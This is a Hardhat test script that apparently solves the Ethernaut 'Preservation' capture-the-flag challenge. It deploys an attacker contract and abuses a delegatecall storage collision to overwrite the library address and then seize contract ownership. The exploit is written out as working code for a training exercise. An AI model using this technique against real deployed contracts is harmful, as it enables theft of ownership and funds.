import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("Preservation", function () {
    let signer: Signer;
    let player: string;
    let challenge_instance_address = "0x8df04076498b7224ed64F5d5381eeeb4fd9B6c8D";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);
        challengeFactory = await ethers.getContractFactory("Preservation");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        let challengeOwner = await challenge.owner();
        console.log("Current challenge owner:", challengeOwner);

        // Create a contract that will be used to collide with the first time library's address' storage slot
        const attackerContract = await ethers.getContractFactory("PreservationSolver");
        const attacker = await attackerContract.deploy();
        await attacker.deployed();

        console.log("Attacker contract deployed at:", attacker.address);

        // Convert contract address to uint256 to pass to challenge setFirstTime():
        const convertedAddress = await attacker.convertAddress();
        console.log("Passing uint256 version of attacker contract:", BigNumber.from(convertedAddress).toString());

        // Changing attacker's first storage slot to contain the address of the attacker contract:
        let setFirstTimeTx = await challenge.setFirstTime(convertedAddress);
        let setFirstTimeReceipt = await setFirstTimeTx.wait();

        // Checking address at storage slot 0 of challenge contract (timeZone1Library state variable):
        const timeZone1Library = await challenge.timeZone1Library();
        expect(timeZone1Library).to.equal(attacker.address);
        console.log("Timezone 1 library address override successful. Calling setFirstTime again to override owner...");
        
        // Calling the challenge's setFirstTime again, this time, since the timeZone1 library state variable points to our attacker address,
        // we can freely control the state variables of the challenge contract.
        setFirstTimeTx = await challenge.setFirstTime(123, {
            gasLimit: 100000
        }); // Arbitrairy argument
        setFirstTimeReceipt = await setFirstTimeTx.wait();

        console.log("setFirstTime delegated to attacker contract. Checking if challenge is solved...");
        
        // Challenge owner should be set to player address at this point
        const challengeOwner2 = await challenge.owner();
        expect(challengeOwner2).to.equal(player);
    });
});
